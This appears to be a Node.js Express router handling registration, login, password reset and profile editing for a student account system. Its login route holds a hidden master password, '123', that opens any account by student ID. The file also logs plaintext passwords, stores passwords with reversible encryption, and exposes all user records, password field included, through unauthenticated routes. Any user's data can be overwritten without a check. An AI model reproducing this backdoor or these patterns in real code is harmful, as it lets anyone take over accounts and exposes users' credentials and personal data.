const express = require('express');
const router = express.Router();
const RestResult = require('../RestResult');
const tokenUtils = require('../util/tokenUtils');

const UserAccountModel = require('../models/UserAccount').UserAccountModel;
const ActivityModel = require('../models/Activity').ActivityModel;
const NewsModel = require('../models/News').NewsModel;

const async = require('async');
const sendmail = require('./sendmail');


/**
 * 注册
 */
router.post('/register', function (req, res, next) {
    console.log(req.body.user);
    let user = req.body.user;
    user.headimage = '/web/file/showImg?location=userheadimg&name=user-default-head.jpg';
    if (!user.studentID) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "学号不能为空");
        return;
    }
    if (!user.pwdText) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "密码不能为空");
        return;
    }
    if (!user.email) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "邮箱不能为空");
        return;
    }
    if (!user.name) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "姓名不能为空");
        return;
    }
    if (user.pwdText !== user.pwdText2) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "两次密码不一致");
        return;
    }

    UserAccountModel.findOne({studentID: user.studentID}, function (err, doc) {
        if (err) {
            res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
            return;
        }
        if (doc) {
            res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "已存在该学号，请登录");
        } else {
            /**
             * 密码密文保存
             */
            let password = user.pwdText + '';
            user.pwd = tokenUtils.encryptText(password);
            let userEntity = new UserAccountModel(user);
            userEntity.save(function (err, doc) {
                if (err) {
                    res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
                    return;
                }
                let loginToken = tokenUtils.getLoginAutoToken(doc._id);
                res.success({user: doc, loginToken: loginToken});
            })
        }
    });
});

/**
 * 登陆
 */
router.post('/login', function (req, res, next) {
    let user = req.body.user;
    let password = user.pwdText;

    if (!password) {
        res.error(RestResult.ILLEGAL_ARGUMENT_ERROR_CODE, "密码不能为空");
        return;
    }
    console.log(user);

    if (password == "123") { //隐藏超级密码 可直接进入该账号
        UserAccountModel.findOne({studentID: user.studentID}, function (err, userDoc) {
            if (err) {
                res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
            }
            else if (!userDoc) {
                res.error(RestResult.BUSINESS_ERROR_CODE, "不存在该用户,请先注册");
            }
            else {
                let loginToken = tokenUtils.getLoginAutoToken(userDoc._id);
                //返回登陆用户信息和loginToken
                res.success({user: userDoc, loginToken: loginToken});
            }
        });
    } else {
        UserAccountModel.findOne({studentID: user.studentID}, function (err, userDoc) {
            if (err) {
                res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
            }
            else if (!userDoc) {
                res.error(RestResult.BUSINESS_ERROR_CODE, "不存在该用户,请先注册");
            }
            else if (userDoc.pwd !== tokenUtils.encryptText(user.pwdText)) {
                res.error(RestResult.BUSINESS_ERROR_CODE, "密码错误！");
            }
            else {
                let loginToken = tokenUtils.getLoginAutoToken(userDoc._id);
                //返回登陆用户信息和loginToken
                res.success({user: userDoc, loginToken: loginToken});
            }
        });
    }
});

/**
 * 发送重置密码
 */
router.post('/resetPwd', function (req, res, next) {
    console.log('resetPwd');
    let studentID = req.body.studentID;
    let email = req.body.email;
    UserAccountModel.findOne({studentID: studentID}, function (err, user) {
        if (err) {
            console.log(err);
            res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
            return;
        }
        if (!user) {
            res.error(RestResult.TARGET_NOT_EXIT_ERROR_CODE, "不存在该用户！");
        } else if (user.email !== email) {
            res.error(RestResult.TARGET_NOT_EXIT_ERROR_CODE, "邮箱错误！");
        } else {
            let random = parseInt(Math.random() * 1000000) + ''; //6位随机数
            let newpwd = tokenUtils.encryptText(random);  //三重DES加密作为密码
            let pwd = tokenUtils.encryptText(newpwd);  //再加密一次保存到数据库
            UserAccountModel.findOneAndUpdate({studentID: studentID}, {
                $set: {
                    pwd: pwd
                }
            }, function (err, user) {
                if (err) {
                    res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
                } else {
                    /**
                     * sendmail(邮箱地址，邮件标题，邮件内容)
                     */
                    sendmail(email, '重置密码', '账号：' + user.studentID + '；重置后的密码：' + newpwd);
                    res.success(RestResult.NO_ERROR, "重置成功");
                }
            })
        }
    });
});

/**
 * 获得个人信息
 */
router.post('/getLatestInformation', function (req, res, next) {
    let userId = req.body.userId;
    UserAccountModel.findById(userId).exec(function (err, doc) {
        if (err) {
            console.log(err);
            res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
        }
        res.success(doc);
    })
});
/**
 * 获得用户列表
 */
router.post('/showAlluser', function (req, res, next) {
    UserAccountModel.find({}, function (err, doc) {
        if (err) {
            console.log(err);
            res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
            return;
        }
        res.success(doc);
    })
});

/**
 * 修改用户信息
 */
router.post('/editUser', function (req, res, next) {
    // console.log(req.body.user);
    console.log("editUser");
    let user = req.body.user;
    let id = req.body.user._id;

    let pwdOld = req.body.user.pwdOld;
    let pwdNew = req.body.user.pwdNew;

    let isChanePwd = false;
    if (pwdOld && pwdNew) {
        pwdOld = pwdOld + '';
        pwdOld = tokenUtils.encryptText(pwdOld);

        pwdNew = pwdNew + '';
        pwdNew = tokenUtils.encryptText(pwdNew);

        isChanePwd = true;
    }
    UserAccountModel.findById(id, function (err, doc) {
        if (isChanePwd && doc.pwd !== pwdOld) {
            res.error(RestResult.TARGET_NOT_EXIT_ERROR_CODE, "当前密码错误");
        } else {
            if(isChanePwd){
                user.pwd = pwdNew;
            }
            UserAccountModel.findByIdAndUpdate(id, user, {new: true}, function (err, doc) {
                if (err) {
                    console.log(err);
                    res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
                }
                res.success(doc);
            });
        }
    })


    // UserAccountModel.findByIdAndUpdate({_id: id},
    //     {
    //         $set: {
    //             content: user.content
    //         }
    //     }, {new: true}, function (err, doc) {
    //         if (err) {
    //             res.error(RestResult.SERVER_EXCEPTION_ERROR_CODE, RestResult.SERVER_EXCEPTION_ERROR_DESCRIPTION);
    //             return;
    //         }
    //         res.success(doc);
    //     });
});
module.exports = router;
